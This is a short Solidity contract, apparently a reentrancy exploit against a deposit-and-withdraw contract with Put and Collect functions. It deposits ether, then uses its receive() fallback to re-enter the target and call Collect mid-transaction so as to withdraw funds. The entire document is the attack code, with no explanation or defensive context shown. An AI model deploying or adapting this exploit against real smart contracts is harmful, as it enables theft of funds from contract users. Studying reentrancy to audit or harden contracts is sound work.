contract ReentrantAttacker {
    bool private attacking;
    C private target;
    uint256 private depositAmount;
    uint256 private collectAmount;

    function attack(address _target, uint256 _depositAmount, uint256 _collectAmount) public payable {
        target = C(_target);
        depositAmount = _depositAmount;
        collectAmount = _collectAmount;
        attacking = true;
        target.Put{value: depositAmount}(block.timestamp + 1000);
    }

    receive() external payable {
        if (attacking) {
            attacking = false;
            target.Put{value: 0}(block.timestamp + 1000);
            target.Collect(collectAmount);
        }
    }
}

